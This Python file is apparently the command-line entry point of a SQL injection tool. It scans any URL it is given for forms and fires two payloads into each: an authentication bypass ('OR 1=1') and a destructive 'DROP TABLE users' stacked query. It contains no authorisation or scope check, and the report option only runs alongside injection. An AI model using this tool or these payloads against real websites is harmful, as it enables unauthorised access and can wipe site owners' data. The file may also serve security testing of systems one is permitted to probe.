# sql_injection_cli/cli.py

import argparse
from sql_injection_cli.scanner import Scanner
from sql_injection_cli.injection_engine import InjectionEngine
from sql_injection_cli.detection_module import DetectionModule
from sql_injection_cli.reporting_module import ReportingModule


def main():
    parser = argparse.ArgumentParser(description="SQL Injection CLI Tool")

    parser.add_argument("url", help="Target URL to scan for SQL injection vulnerabilities")
    parser.add_argument("--scan", action="store_true", help="Scan the target website")
    parser.add_argument("--inject", action="store_true", help="Inject SQL payloads")
    parser.add_argument("--report", action="store_true", help="Generate a report of vulnerabilities")

    args = parser.parse_args()

    scanner = Scanner(args.url)
    injection_engine = InjectionEngine(args.url)
    detection_module = DetectionModule()
    reporting_module = ReportingModule()

    if args.scan:
        forms = scanner.scan()
        print("Found forms:")
        for form in forms:
            print(form)

    if args.inject:
        forms = scanner.scan()
        vulnerabilities = []
        payloads = ["' OR 1=1 --", "'; DROP TABLE users; --"]
        for form in forms:
            for payload in payloads:
                response = injection_engine.inject(form, payload)
                if detection_module.detect(response):
                    vulnerabilities.append({
                        "url": args.url,
                        "payload": payload
                    })
        print("Injection complete. Use --report to generate a report.")

        if args.report:
            reporting_module.generate_report(vulnerabilities)
            print("Report generated: report.txt")


if __name__ == "__main__":
    main()
